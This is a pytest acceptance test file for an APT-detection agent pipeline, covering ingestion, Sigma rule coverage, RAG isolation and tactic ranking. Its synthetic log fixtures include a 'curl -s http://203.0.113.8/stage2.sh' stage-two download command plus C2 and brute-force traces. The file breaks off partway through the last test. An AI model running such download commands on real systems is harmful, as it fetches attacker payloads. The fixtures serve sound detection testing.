"""Opaque-box Acceptance Matrix E2E tests (Interface §7 S7.1-S7.6 & Design P1-P9).

All ``apt_agent`` imports are deferred inside test functions and private helpers
so collection and static hygiene checks remain decoupled from unimplemented
M3-M6 modules until those milestones land.
"""

from __future__ import annotations

import inspect
import json
import shutil
import sys
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from typing import Any

import pytest
from pydantic import ValidationError

_E2E_DIR = str(Path(__file__).resolve().parent)
if _E2E_DIR not in sys.path:
    sys.path.insert(0, _E2E_DIR)

import _helpers  # noqa: E402

pytestmark = pytest.mark.acceptance


def _field(obj: Any, name: str, default: Any = None) -> Any:
    """Read an attribute or mapping key without coupling to dict vs model."""
    if isinstance(obj, dict):
        return obj.get(name, default)
    return getattr(obj, name, default)


def _locator_map(index: dict[str, dict[str, Any]]) -> dict[str, Any]:
    """Convert Label_Index.json mapping into ``dict[str, Locator]``."""
    from apt_agent.models import Locator

    return {
        pid: Locator(filepath=meta["filepath"], linenumber=meta["linenumber"])
        for pid, meta in index.items()
    }


def _copy_rules(src_dir: Path, dst_dir: Path, names: list[str] | None = None) -> Path:
    """Copy selected Sigma YAML rules into ``dst_dir``."""
    dst_dir.mkdir(parents=True, exist_ok=True)
    if names is None:
        for p in sorted(src_dir.glob("*.y*ml")):
            shutil.copy2(p, dst_dir / p.name)
    else:
        for name in names:
            src = src_dir / name
            shutil.copy2(src, dst_dir / src.name)
    return dst_dir


def _extract_chain_pids(
    case_result: Any,
    event_to_pid: dict[str, str],
) -> tuple[set[str], list[Any]]:
    """Extract verified chain physical IDs and non-verified/disputed items."""
    chains = _field(case_result, "chains", []) or []
    unresolved = list(_field(case_result, "unresolved", []) or [])
    verified_pids: set[str] = set()
    for ch in chains:
        ev_ids = _field(ch, "event_ids", []) or []
        for eid in ev_ids:
            if eid in event_to_pid:
                verified_pids.add(event_to_pid[eid])
        for e in _field(ch, "events", []) or []:
            eid = _field(e, "event_id", None)
            pid = _field(e, "physical_record_id", None)
            if pid:
                verified_pids.add(pid)
            elif eid and eid in event_to_pid:
                verified_pids.add(event_to_pid[eid])
    for eid in _field(case_result, "attack_event_ids", []) or []:
        if eid in event_to_pid:
            verified_pids.add(event_to_pid[eid])
    return verified_pids, unresolved


def _build_observed_submission(
    *,
    ctx: Any,
    task_id: str,
    submission_id: str,
    query_id: str,
    claim: str,
    evidence_event_ids: list[str],
    tactic_ids: list[str],
    edges: list[Any] | None = None,
) -> Any:
    """Construct a valid ``Submission`` with ``observed`` findings."""
    from apt_agent.models import Finding, Submission

    finding = Finding(
        claim=claim,
        status="observed",
        evidence_event_ids=list(evidence_event_ids),
        knowledge_refs=[],
        tactic_ids=list(tactic_ids),
    )
    return Submission(
        case_id=ctx.case_id,
        run_id=ctx.run_id,
        task_id=task_id,
        submission_id=submission_id,
        query_ids=[query_id],
        findings=[finding],
        edges=list(edges or []),
    )


def _submit_expect_conflict(bb: Any, ctx: Any, submission: Any) -> None:
    """Assert resubmitting a conflicting payload for same submission_id fails."""
    try:
        receipt = bb.submit_findings(ctx, submission)
    except Exception:
        return
    rejected = _field(receipt, "rejected_refs", []) or []
    assert len(rejected) > 0, (
        "Conflicting resubmission with same submission_id must either raise or "
        f"return rejected_refs, got {receipt!r}"
    )


def _events_for_pid(events: list[Any], pid: str) -> list[Any]:
    return [ev for ev in events if _field(ev, "physical_record_id") == pid]


def _make_rag_service(cfg: Any) -> Any:
    """Instantiate RagService across either AppConfig or RagConfig signatures."""
    from apt_agent.tools import RagService

    try:
        return RagService(cfg)
    except (TypeError, ValueError):
        return RagService(cfg.rag)


def _maybe_exhaust_budget_manager(cfg: Any) -> Any | None:
    """Probe optional BudgetManager export in apt_agent.agents without hard coupling."""
    import apt_agent.agents as agents_mod

    bm_cls = getattr(agents_mod, "BudgetManager", None)
    if bm_cls is None:
        return None
    bm = bm_cls(cfg.budget)
    reserve_tokens = int(cfg.budget.max_tokens * cfg.budget.reserve_ratio) + 1
    for method_name in ("consume", "consume_tokens", "record_tokens"):
        fn = getattr(bm, method_name, None)
        if callable(fn):
            params = inspect.signature(fn).parameters
            if "tokens" in params:
                kwargs: dict[str, Any] = {"tokens": reserve_tokens}
                if "rounds" in params:
                    kwargs["rounds"] = 1
                fn(**kwargs)
            else:
                fn(reserve_tokens)
            break
    for method_name in ("advance_round", "record_round"):
        fn = getattr(bm, method_name, None)
        if callable(fn):
            fn()
            break
    for pred_name in ("should_stop_expansion", "should_stop", "check_stop"):
        fn = getattr(bm, pred_name, None)
        if callable(fn):
            stopped = fn()
            assert bool(stopped) is True
            break
    if hasattr(bm, "stop_reason"):
        sr_attr = getattr(bm, "stop_reason")
        sr_val = sr_attr() if callable(sr_attr) else sr_attr
        if sr_val is not None:
            assert isinstance(sr_val, str) and sr_val.strip() != ""
    return bm


def _maybe_run_investigation(
    *,
    ctx: Any,
    cfg: Any,
    store: Any,
    events: list[Any],
    det_res: Any,
    rag_svc: Any | None = None,
    registry: Any | None = None,
    blackboard: Any | None = None,
    budget_manager: Any | None = None,
) -> Any | None:
    """Probe optional run_investigation export in apt_agent.agents via inspect.signature."""
    import apt_agent.agents as agents_mod

    runner_fn = getattr(agents_mod, "run_investigation", None)
    if not callable(runner_fn):
        return None
    hits = _field(det_res, "hits", []) or []
    coverage = _field(det_res, "coverage", []) or []
    leads = _field(det_res, "leads", []) or []
    candidates: dict[str, Any] = {
        "ctx": ctx,
        "context": ctx,
        "config": cfg,
        "cfg": cfg,
        "store": store,
        "raw_store": store,
        "events": events,
        "det_res": det_res,
        "detection": det_res,
        "detection_result": det_res,
        "hits": hits,
        "coverage": coverage,
        "leads": leads,
        "rag_service": rag_svc,
        "rag": rag_svc,
        "registry": registry,
        "tool_registry": registry,
        "blackboard": blackboard,
        "bb": blackboard,
        "budget_manager": budget_manager,
        "budget": budget_manager,
    }
    sig = inspect.signature(runner_fn)
    pos_args: list[Any] = []
    kwargs: dict[str, Any] = {}
    for name, param in sig.parameters.items():
        if param.kind in (
            inspect.Parameter.VAR_POSITIONAL,
            inspect.Parameter.VAR_KEYWORD,
        ):
            continue
        has_val = name in candidates and candidates[name] is not None
        if param.kind == inspect.Parameter.POSITIONAL_ONLY:
            if has_val:
                pos_args.append(candidates[name])
            elif param.default is not inspect.Parameter.empty:
                pos_args.append(param.default)
            else:
                return None
        else:
            if has_val:
                kwargs[name] = candidates[name]
            elif param.default is inspect.Parameter.empty:
                return None
    return runner_fn(*pos_args, **kwargs)


# ---------------------------------------------------------------------------
# Interface §7 Acceptance Tests (S7.1 - S7.6)
# ---------------------------------------------------------------------------


def test_s7_1_multiformat_physical_record_localization(
    e2e_fixtures_dir: Path,
    tmp_path: Path,
    make_run_context,
    load_scene_records,
) -> None:
    """S7.1: Multi-format 2nd-record localization & blank-line preservation."""
    from apt_agent.ingestion import Normalizer, ingest_records

    logs_dir = e2e_fixtures_dir / "logs"
    index_all, records_all = load_scene_records(logs_dir)

    # (a) 2-line JSONL fixture in tmp_path
    jsonl_scene = tmp_path / "jsonl_scene"
    (jsonl_scene / "data").mkdir(parents=True)
    (jsonl_scene / "data" / "events.jsonl").write_text(
        '{"id": "j-1", "hostname": "H-J1", "timestamp_ms": 1717063200000, "object": "PROCESS", "action": "CREATE", "properties": {"image_path": "cmd.exe"}}\n'
        '{"id": "j-2", "hostname": "H-J2", "timestamp_ms": 1717063205000, "object": "PROCESS", "action": "CREATE", "properties": {"image_path": "whoami.exe"}}\n',
        encoding="utf-8",
    )
    (jsonl_scene / "Label_Index.json").write_text(
        json.dumps(
            {
                "pr-jsonl-0001": {"filepath": "data/events.jsonl", "linenumber": 1},
                "pr-jsonl-0002": {"filepath": "data/events.jsonl", "linenumber": 2},
            }
        ),
        encoding="utf-8",
    )
    jsonl_idx, jsonl_recs = load_scene_records(jsonl_scene)
    jsonl_store = ingest_records(
        iter(jsonl_recs),
        case_id="s7-1-jsonl",
        run_id="run-s7-1-jsonl",
        locator_map=_locator_map(jsonl_idx),
    )
    j_raws, j_missing = jsonl_store.fetch_raw_evidence(["pr-jsonl-0002"])
    assert j_missing == []
    assert len(j_raws) == 1
    assert _field(j_raws[0], "physical_record_id") == "pr-jsonl-0002"
    if _field(j_raws[0], "raw_id", None) is not None:
        assert _field(j_raws[0], "raw_id") == "pr-jsonl-0002"
    assert _field(j_raws[0], "payload")["id"] == "j-2"
    assert _field(j_raws[0], "locator").filepath == "data/events.jsonl"
    assert _field(j_raws[0], "locator").linenumber == 2

    # (b) 2nd multiline XML Event, (c) 2nd multiline Bash group, (d) 2nd syslog
    ctx = make_run_context(
        case_id="s7-1-logs",
        run_id="run-s7-1-logs",
        valid_physical_ids=set(index_all),
        locator_map=_locator_map(index_all),
    )
    store = ingest_records(
        iter(records_all),
        case_id=ctx.case_id,
        run_id=ctx.run_id,
        locator_map=_locator_map(index_all),
    )
    target_xml_pid = "pr-000000000000000000000007"
    target_bash_pid = "pr-000000000000000000000016"
    target_syslog_pid = "pr-000000000000000000000013"

    fetched, missing = store.fetch_raw_evidence(
        [target_xml_pid, target_bash_pid, target_syslog_pid]
    )
    assert missing == []
    by_pid = {_field(r, "physical_record_id"): r for r in fetched}

    xml_rec = by_pid[target_xml_pid]
    assert _field(xml_rec, "locator").linenumber == 2
    assert "windows_event_sysmon.xml" in _field(xml_rec, "locator").filepath
    assert "<EventRecordID>1002</EventRecordID>" in _field(xml_rec, "payload")["raw_text"]

    bash_rec = by_pid[target_bash_pid]
    assert _field(bash_rec, "locator").linenumber == 2
    assert _field(bash_rec, "payload")["timestamp"] == 1717063330
    assert "\n" in _field(bash_rec, "payload")["raw_text"]
    assert "beacon" in _field(bash_rec, "payload")["raw_text"]

    syslog_rec = by_pid[target_syslog_pid]
    assert _field(syslog_rec, "locator").linenumber == 2
    assert "Failed password for invalid user admin" in _field(syslog_rec, "payload")["raw_text"]

    norm = Normalizer().normalize_batch(ctx, store)
    for pid in (target_xml_pid, target_bash_pid, target_syslog_pid):
        evs = _events_for_pid(norm.events, pid)
        assert len(evs) >= 1, f"Expected normalized event(s) for {pid}"
        assert all(_field(e, "physical_record_id") == pid for e in evs)

    # (e) Blank-line preservation via Label_Index_blank_line.json
    blank_scene = tmp_path / "blank_scene"
    shutil.copytree(logs_dir / "data", blank_scene / "data")
    shutil.copy2(logs_dir / "Label_Index_blank_line.json", blank_scene / "Label_Index.json")
    blank_idx, blank_recs = load_scene_records(blank_scene)
    blank_ctx = make_run_context(
        case_id="s7-1-blank",
        run_id="run-s7-1-blank",
        valid_physical_ids=set(blank_idx),
        locator_map=_locator_map(blank_idx),
    )
    blank_store = ingest_records(
        iter(blank_recs),
        case_id=blank_ctx.case_id,
        run_id=blank_ctx.run_id,
        locator_map=_locator_map(blank_idx),
    )
    blank_raws, blank_missing = blank_store.fetch_raw_evidence(
        ["pr-900000000000000000000001", "pr-900000000000000000000002"]
    )
    assert blank_missing == []
    assert len(blank_raws) == 2
    for r in blank_raws:
        assert _field(r, "locator").linenumber == 2
        assert _field(r, "payload") == {"raw_text": ""}
    blank_norm = Normalizer().normalize_batch(blank_ctx, blank_store)
    assert blank_norm.events == []
    assert len(blank_norm.gaps) >= 2


def test_s7_2_empty_prediction_and_illegal_tactic_key(
    e2e_fixtures_dir: Path,
    make_app_config,
    make_run_context,
    load_scene_records,
) -> None:
    """S7.2: Empty benign prediction, omitted empty tactics, illegal tactic T1059 rejected."""
    from apt_agent.blackboard import Blackboard, rank, verify
    from apt_agent.ingestion import Normalizer, ingest_records
    from apt_agent.models import Prediction
    from apt_agent.pipeline import analyze_records, to_prediction

    # (a) Full benign scene produces valid empty Prediction
    scene_dir = e2e_fixtures_dir / "scenarios" / "scene_09_benign"
    index, records = load_scene_records(scene_dir)
    cfg = make_app_config(llm_enabled=False)
    pred_benign = analyze_records(
        iter(records),
        config=cfg,
        valid_physical_ids=set(index),
        locator_map=_locator_map(index),
    )
    _helpers.assert_valid_prediction(pred_benign, set(index))
    assert pred_benign == {"physical_id_set": [], "ta_physical_ids": {}}

    # (b) Attack event with empty tactic_ranked_event_ids omits empty tactics
    ctx = make_run_context(
        case_id="s7-2-case",
        run_id="run-s7-2",
        config=cfg,
        valid_physical_ids=set(index),
        locator_map=_locator_map(index),
    )
    store = ingest_records(
        iter(records),
        case_id=ctx.case_id,
        run_id=ctx.run_id,
        locator_map=_locator_map(index),
    )
    norm = Normalizer().normalize_batch(ctx, store)
    target_ev = _events_for_pid(norm.events, "pr-s09-0001")[0]

    bb = Blackboard(ctx, {target_ev.event_id}, valid_physical_ids=set(index))
    bb.record_task_query("t-1", "q-1", {target_ev.event_id})
    sub = _build_observed_submission(
        ctx=ctx,
        task_id="t-1",
        submission_id="sub-s7-2",
        query_id="q-1",
        claim="Attack event without tactic assignment",
        evidence_event_ids=[target_ev.event_id],
        tactic_ids=[],
    )
    bb.submit_findings(ctx, sub)
    v_res = verify(ctx, bb)
    case_res = rank(ctx, v_res.verified_state, store, [], [])

    cr_no_tactics = case_res.model_copy(
        update={
            "attack_event_ids": [target_ev.event_id],
            "tactic_ranked_event_ids": {},
        }
    )
    pred_no_ta = to_prediction(ctx, cr_no_tactics, valid_physical_ids=set(index))
    _helpers.assert_valid_prediction(pred_no_ta, set(index))
    assert pred_no_ta == {"physical_id_set": ["pr-s09-0001"], "ta_physical_ids": {}}

    # (c) Illegal tactic key 'T1059' and extra top-level key rejected
    with pytest.raises((ValidationError, ValueError)):
        Prediction(physical_id_set=["pr-1"], ta_physical_ids={"T1059": ["pr-1"]})

    with pytest.raises((ValidationError, ValueError)):
        Prediction(
            physical_id_set=[],
            ta_physical_ids={},
            extra_unexpected_key="forbidden",
        )

    cr_illegal_ta = case_res.model_copy(
        update={
            "attack_event_ids": [target_ev.event_id],
            "tactic_ranked_event_ids": {"T1059": [target_ev.event_id]},
        }
    )
    with pytest.raises((ValidationError, ValueError)):
        to_prediction(ctx, cr_illegal_ta, valid_physical_ids=set(index))


def test_s7_3_four_candidates_same_origin_dedup_before_top3(
    e2e_fixtures_dir: Path,
    make_app_config,
    make_run_context,
    load_scene_records,
) -> None:
    """S7.3: Dedup sibling same-origin events before top-3 truncation, keep all 4 in physical_id_set."""
    from apt_agent.blackboard import Blackboard, rank, verify
    from apt_agent.ingestion import Normalizer, ingest_records
    from apt_agent.models import Event
    from apt_agent.pipeline import analyze_records, to_prediction

    # (a) Unit/module contract test with 2 sibling events from pr-ta2-1 + pr-ta2-2..4
    cfg = make_app_config(llm_enabled=False)
    pids = ["pr-ta2-1", "pr-ta2-2", "pr-ta2-3", "pr-ta2-4"]
    raw_records = [
        (
            pid,
            {
                "id": f"ecar-{idx}",
                "object": "PROCESS",
                "action": "CREATE",
                "hostname": "H1.example.local",
                "timestamp_ms": 1717063200000 + idx * 1000,
                "properties": {
                    "image_path": "curl",
                    "command_line": f"curl -s http://203.0.113.8/stage2.sh?i={idx}",
                },
            },
        )
        for idx, pid in enumerate(pids, start=1)
    ]
    ctx = make_run_context(
        case_id="s7-3-unit",
        run_id="run-s7-3-unit",
        config=cfg,
        valid_physical_ids=set(pids),
    )
    store = ingest_records(iter(raw_records), case_id=ctx.case_id, run_id=ctx.run_id)

    ev_a1 = Event(
        event_id="ev-ta2-a1",
        physical_record_id="pr-ta2-1",
        source_type="ecar",
        event_time="2024-05-30T10:00:01Z",
        fields={"Image": "powershell.exe"},
    )
    ev_a2 = Event(
        event_id="ev-ta2-a2",
        physical_record_id="pr-ta2-1",
        source_type="ecar",
        event_time="2024-05-30T10:00:01Z",
        fields={"Image": "powershell.exe", "sub": "child"},
    )
    ev_2 = Event(
        event_id="ev-ta2-2",
        physical_record_id="pr-ta2-2",
        source_type="ecar",
        event_time="2024-05-30T10:00:02Z",
        fields={"Image": "curl"},
    )
    ev_3 = Event(
        event_id="ev-ta2-3",
        physical_record_id="pr-ta2-3",
        source_type="ecar",
        event_time="2024-05-30T10:00:03Z",
        fields={"Image": "curl"},
    )
    ev_4 = Event(
        event_id="ev-ta2-4",
        physical_record_id="pr-ta2-4",
        source_type="ecar",
        event_time="2024-05-30T10:00:04Z",
        fields={"Image": "curl"},
    )
    ranked_eids = ["ev-ta2-a1", "ev-ta2-a2", "ev-ta2-2", "ev-ta2-3", "ev-ta2-4"]
    bb = Blackboard(ctx, set(ranked_eids), valid_physical_ids=set(pids))
    bb.record_task_query("t-ta2", "q-ta2", set(ranked_eids))
    sub = _build_observed_submission(
        ctx=ctx,
        task_id="t-ta2",
        submission_id="sub-ta2",
        query_id="q-ta2",
        claim="Four distinct TA0002 candidates with two siblings from pr-ta2-1",
        evidence_event_ids=ranked_eids,
        tactic_ids=["TA0002"],
    )
    bb.submit_findings(ctx, sub)
    v_res = verify(ctx, bb)
    case_res = rank(
        ctx, v_res.verified_state, store, [], [], events=[ev_a1, ev_a2, ev_2, ev_3, ev_4]
    )
    forced_res = case_res.model_copy(
        update={
            "attack_event_ids": ranked_eids,
            "tactic_ranked_event_ids": {"TA0002": ranked_eids},
        }
    )
    pred_unit = to_prediction(ctx, forced_res, valid_physical_ids=set(pids))
    _helpers.assert_valid_prediction(pred_unit, set(pids))
    assert pred_unit["ta_physical_ids"]["TA0002"] == [
        "pr-ta2-1",
        "pr-ta2-2",
        "pr-ta2-3",
    ]
    assert pred_unit["physical_id_set"] == [
        "pr-ta2-1",
        "pr-ta2-2",
        "pr-ta2-3",
        "pr-ta2-4",
    ]

    # (b) End-to-end analyze_records on scene_05_full_16_types
    scene_dir = e2e_fixtures_dir / "scenarios" / "scene_05_full_16_types"
    index, records = load_scene_records(scene_dir)
    meta = json.loads((scene_dir / "expected_meta.json").read_text(encoding="utf-8"))
    pred_e2e = analyze_records(
        iter(records),
        config=cfg,
        valid_physical_ids=set(index),
        locator_map=_locator_map(index),
    )
    _helpers.assert_valid_prediction(pred_e2e, set(index))
    assert "TA0002" in pred_e2e["ta_physical_ids"]
    assert len(pred_e2e["ta_physical_ids"]["TA0002"]) == meta["ta0002_max_len"]
    assert set(meta["s7_3_ta0002_candidates"]) <= set(pred_e2e["physical_id_set"])
    # Ensure Normalizer keeps consistent mapping on scene_05
    s5_ctx = make_run_context(
        case_id="s7-3-e2e",
        run_id="run-s7-3-e2e",
        config=cfg,
        valid_physical_ids=set(index),
        locator_map=_locator_map(index),
    )
    s5_store = ingest_records(
        iter(records),
        case_id=s5_ctx.case_id,
        run_id=s5_ctx.run_id,
        locator_map=_locator_map(index),
    )
    s5_norm = Normalizer().normalize_batch(s5_ctx, s5_store)
    assert len(s5_norm.events) >= 16


def test_s7_4_rule_coverage_state_differentiation(
    e2e_fixtures_dir: Path,
    tmp_path: Path,
    make_app_config,
    make_run_context,
    load_scene_records,
) -> None:
    """S7.4: Distinguish RuleRun states ran (0-hit & matched), skipped (missing logsource), failed (crash)."""
    from apt_agent.detection import DetectionCoordinator
    from apt_agent.ingestion import Normalizer, ingest_records

    rules_dir = _copy_rules(
        e2e_fixtures_dir / "rules" / "valid",
        tmp_path / "rules",
        [
            "benign_no_match.yml",
            "syslog_ssh_bruteforce.yml",
            "win_winword_powershell.yml",
        ],
    )
    cfg = make_app_config(
        rules_dir=rules_dir,
        engine_modes={"hayabusa": "crash"},
        enabled_engines={"zircolite", "hayabusa", "rsigma"},
        llm_enabled=False,
    )
    scene_dir = e2e_fixtures_dir / "scenarios" / "scene_01_phishing_c2"
    index, records = load_scene_records(scene_dir)
    sysmon_records = [r for r in records if r[0] in ("pr-s01-0001", "pr-s01-0002")]

    ctx = make_run_context(
        case_id="s7-4-coverage",
        run_id="run-s7-4",
        config=cfg,
        valid_physical_ids={"pr-s01-0001", "pr-s01-0002"},
    )
    store = ingest_records(iter(sysmon_records), case_id=ctx.case_id, run_id=ctx.run_id)
    norm = Normalizer().normalize_batch(ctx, store)

    det_res = DetectionCoordinator(cfg).detect(ctx, norm.events, ruleset_version=ctx.ruleset_version)
    coverage = _field(det_res, "coverage", [])
    hits = _field(det_res, "hits", [])

    statuses = {_field(r, "status") for r in coverage}
    assert {"ran", "skipped", "failed"} <= statuses

    for run in coverage:
        assert _field(run, "engine"), f"Missing engine on RuleRun {run!r}"
        assert _field(run, "engine_version"), f"Missing engine_version on RuleRun {run!r}"
        assert _field(run, "rule_id"), f"Missing rule_id on RuleRun {run!r}"
        assert _field(run, "rule_version"), f"Missing rule_version on RuleRun {run!r}"
        st = _field(run, "status")
        if st in ("skipped", "failed"):
            assert _field(run, "reason"), f"Expected non-empty reason for {st} RuleRun {run!r}"

    # Benign rule ran with 0 hits
    benign_runs = [
        r
        for r in coverage
        if _field(r, "rule_id") == "11111111-2222-3333-4444-555555555599"
        and _field(r, "status") == "ran"
    ]
    assert len(benign_runs) >= 1
    assert not any(
        _field(h, "rule_id") == "11111111-2222-3333-4444-555555555599" for h in hits
    )

    # Syslog rule skipped due to missing linux/sshd logsource
    skipped_syslog = [
        r
        for r in coverage
        if _field(r, "rule_id") == "11111111-2222-3333-4444-555555555506"
        and _field(r, "status") == "skipped"
    ]
    assert len(skipped_syslog) >= 1

    # Hayabusa failed due to crash
    failed_haya = [
        r
        for r in coverage
        if _field(r, "engine") == "hayabusa" and _field(r, "status") == "failed"
    ]
    assert len(failed_haya) >= 1

    # Multi-engine hits on pr-s01-0001 deduplicated by event_id back to pr-s01-0001
    ev_to_pid = {ev.event_id: ev.physical_record_id for ev in norm.events}
    ww_hits = [
        h for h in hits if _field(h, "rule_id") == "11111111-2222-3333-4444-555555555501"
    ]
    assert len(ww_hits) >= 1
    hit_pids = {ev_to_pid[eid] for h in ww_hits for eid in _field(h, "event_ids", [])}
    assert hit_pids == {"pr-s01-0001"}


def test_s7_5_rag_isolation_crosscase_and_count_only_correlation(
    e2e_fixtures_dir: Path,
    tmp_path: Path,
    make_app_config,
    make_run_context,
    load_scene_records,
) -> None:
    """S7.5: RAG historical isolation, cross-case rejection, and count-only correlation leads."""
    from apt_agent.blackboard import Blackboard, rank, verify
    from apt_agent.detection import DetectionCoordinator
    from apt_agent.ingestion import Normalizer, ingest_records
    from apt_agent.models import Finding, KnowledgeRef, Submission
    from apt_agent.pipeline import to_prediction
    from apt_agent.tools import ToolRegistry

    # Setup scene_01
    s1_dir = e2e_fixtures_dir / "scenarios" / "scene_01_phishing_c2"
    s1_idx, s1_recs = load_scene_records(s1_dir)
    cfg = make_app_config(llm_enabled=False)
    ctx_s1 = make_run_context(
        case_id="scene_01_phishing_c2",
        run_id="run-s7-5",
        config=cfg,
        valid_physical_ids=set(s1_idx),
        locator_map=_locator_map(s1_idx),
    )
    store_s1 = ingest_records(
        iter(s1_recs),
        case_id=ctx_s1.case_id,
        run_id=ctx_s1.run_id,
        locator_map=_locator_map(s1_idx),
    )
    norm_s1 = Normalizer().normalize_batch(ctx_s1, store_s1)

    # 1. RAG returns historical case with evidence_ids=[] -> cannot produce output IDs
    rag = _make_rag_service(cfg)
    rag_res = rag.search_knowledge("certutil wks-99", role="lead", snapshot_id=ctx_s1.knowledge_snapshot_id)
    assert _field(rag_res, "evidence_ids", []) == []
    refs = _field(rag_res, "refs", [])
    assert any(_field(r, "chunk_id") == "kb-hist-unrelated-certutil" for r in refs)
    hist_ref = next(r for r in refs if _field(r, "chunk_id") == "kb-hist-unrelated-certutil")
    kref = hist_ref if isinstance(hist_ref, KnowledgeRef) else KnowledgeRef(**hist_ref)

    valid_eids = {ev.event_id for ev in norm_s1.events}
    bb = Blackboard(ctx_s1, valid_eids, valid_physical_ids=set(s1_idx))
    sub_hyp = Submission(
        case_id=ctx_s1.case_id,
        run_id=ctx_s1.run_id,
        task_id="task-rag-only",
        submission_id="sub-hyp",
        query_ids=[],
        findings=[
            Finding(
                claim="Historical certutil hypothesis",
                status="hypothesis",
                evidence_event_ids=[],
                knowledge_refs=[kref],
                tactic_ids=["TA0011"],
            )
        ],
        edges=[],
    )
    bb.submit_findings(ctx_s1, sub_hyp)

    # Attempt to smuggle KB chunk_id as observed evidence_event_ids -> rejected
    sub_smuggle = Submission(
        case_id=ctx_s1.case_id,
        run_id=ctx_s1.run_id,
        task_id="task-rag-smuggle",
        submission_id="sub-smuggle",
        query_ids=[],
        findings=[
            Finding(
                claim="Smuggled KB ID as observed evidence",
                status="observed",
                evidence_event_ids=["kb-hist-unrelated-certutil"],
                knowledge_refs=[kref],
                tactic_ids=["TA0011"],
            )
        ],
        edges=[],
    )
    smuggle_receipt = bb.submit_findings(ctx_s1, sub_smuggle)
    assert len(_field(smuggle_receipt, "rejected_refs", [])) >= 1
    assert "kb-hist-unrelated-certutil" not in (_field(smuggle_receipt, "accepted_event_ids", []) or [])

    v_res = verify(ctx_s1, bb)
    case_res = rank(ctx_s1, v_res.verified_state, store_s1, [], [])
    pred_rag_only = to_prediction(ctx_s1, case_res, valid_physical_ids=set(s1_idx))
    assert pred_rag_only == {"physical_id_set": [], "ta_physical_ids": {}}

    # 2. Cross-case forensic request rejected & audited
    registry = ToolRegistry(ctx_s1, store_s1, norm_s1.events, rag)
    cross_res = registry.invoke(
        "host",
        "fetch_raw_evidence",
        {"physical_ids": ["pr-s02-0001"]},
        case_id="scene_02_lateral_movement",
    )
    assert _field(cross_res, "ok") is False or _field(cross_res, "error") is not None
    err_obj = _field(cross_res, "error")
    if err_obj is not None:
        assert _field(err_obj, "code") == "OUT_OF_SCOPE"
    assert len(registry.audit_log) >= 1

    same_case_foreign_id = registry.invoke(
        "host",
        "fetch_raw_evidence",
        {"physical_ids": ["pr-s02-0001"]},
        case_id=ctx_s1.case_id,
    )
    data = _field(same_case_foreign_id, "data", {}) or {}
    assert _field(data, "records", []) == []
    assert "pr-s02-0001" in (_field(data, "missing_ids", []) or [])

    # 3. Count-only correlation via rsigma mode="count_only" stays lead only
    corr_rules = _copy_rules(
        e2e_fixtures_dir / "rules" / "valid",
        tmp_path / "corr_rules",
        ["win_winword_powershell.yml", "win_powershell_c2_flow.yml"],
    )
    shutil.copy2(
        e2e_fixtures_dir / "rules" / "correlation" / "winword_ps_c2_temporal.yml",
        corr_rules / "winword_ps_c2_temporal.yml",
    )
    cfg_co = make_app_config(
        rules_dir=corr_rules,
        engine_modes={"rsigma": "count_only"},
        enabled_engines={"rsigma"},
        llm_enabled=False,
    )
    det_co = DetectionCoordinator(cfg_co).detect(
        ctx_s1.model_copy(update={"config": cfg_co}), norm_s1.events
    )
    corr_leads = _field(det_co, "leads", []) or []
    corr_hits = [
        h
        for h in (_field(det_co, "hits", []) or [])
        if _field(h, "rule_id") == "11111111-2222-3333-4444-555555555502"
    ]
    assert (
        any(_field(lead, "event_ids", []) == [] for lead in corr_leads)
        or any(_field(h, "event_ids", []) == [] for h in corr_hits)
    ), f"Expected count-only correlation lead with event_ids==[], got leads={corr_leads!r}, hits={corr_hits!r}"

    # Verify rank/to_prediction with only count-only correlation hit emits 0 physical IDs
    bb_co = Blackboard(ctx_s1, valid_eids, valid_physical_ids=set(s1_idx))
    v_co = verify(ctx_s1, bb_co)
    cr_co = rank(ctx_s1, v_co.verified_state, store_s1, corr_hits, _field(det_co, "coverage", []))
    pred_co = to_prediction(ctx_s1, cr_co, valid_physical_ids=set(s1_idx))
    assert pred_co == {"physical_id_set": [], "ta_physical_ids": {}}


def test_s7_6_idempotent_submission_and_order_independent_ranking(
    e2e_fixtures_dir: Path,
    make_app_config,
    make_run_context,
    load_scene_records,
) -> None:
    """S7.6: Idempotent duplicate submission, conflict rejection, and order-independent ranking."""
    from apt_agent.blackboard import Blackboard, rank, verify
    from apt_agent.ingestion import Normalizer, ingest_records
    from apt_agent.models import Edge
    from apt_agent.pipeline import to_prediction

    scene_dir = e2e_fixtures_dir / "scenarios" / "scene_01_phishing_c2"
    index, records = load_scene_records(scene_dir)
    cfg = make_app_config(llm_enabled=False)
    ctx = make_run_context(
        case_id="s7-6-case",
        run_id="run-s7-6",
        config=cfg,
        valid_physical_ids=set(index),
        locator_map=_locator_map(index),
    )
    store = ingest_records(iter(records), case_id=ctx.case_id, run_id=ctx.run_id)
    norm = Normalizer().normalize_batch(ctx, store)
    ev_e41 = _events_for_pid(norm.events, "pr-s01-0001")[0]
    ev_e42 = _events_for_pid(norm.events, "pr-s01-0002")[0]
    ev_e43 = _events_for_pid(norm.events, "pr-s01-0003")[0]
    valid_eids = {ev.event_id for ev in norm.events}

    edge_e42_e43 = Edge(
        from_event_id=ev_e42.event_id,
        to_event_id=ev_e43.event_id,
        relation="network_corroborates",
        join_keys={
            "src_ip": "10.0.1.8",
            "src_port": 51030,
            "dst_ip": "203.0.113.8",
            "dst_port": 443,
            "proto": "tcp",
        },
        evidence_event_ids=[ev_e42.event_id, ev_e43.event_id],
        status="proposed",
    )

    sub_host = _build_observed_submission(
        ctx=ctx,
        task_id="task-host",
        submission_id="sub-1",
        query_id="q-host",
        claim="Winword spawned PowerShell and initiated C2 connection",
        evidence_event_ids=[ev_e41.event_id, ev_e42.event_id],
        tactic_ids=["TA0002", "TA0011"],
        edges=[
            Edge(
                from_event_id=ev_e41.event_id,
                to_event_id=ev_e42.event_id,
                relation="same_process_guid",
                join_keys={"Computer": "H1.example.local", "ProcessGuid": "G7"},
                evidence_event_ids=[ev_e41.event_id, ev_e42.event_id],
                status="proposed",
            )
        ],
    )
    sub_net = _build_observed_submission(
        ctx=ctx,
        task_id="task-net",
        submission_id="sub-2",
        query_id="q-net",
        claim="Zeek conn corroborated 5-tuple outbound flow",
        evidence_event_ids=[ev_e43.event_id],
        tactic_ids=["TA0011"],
        edges=[edge_e42_e43],
    )

    # 1. Idempotent retry & 2. Conflict on same submission_id with altered claim
    bb_hn = Blackboard(ctx, valid_eids, valid_physical_ids=set(index))
    bb_hn.record_task_query("task-host", "q-host", {ev_e41.event_id, ev_e42.event_id})
    bb_hn.record_task_query("task-net", "q-net", {ev_e43.event_id})

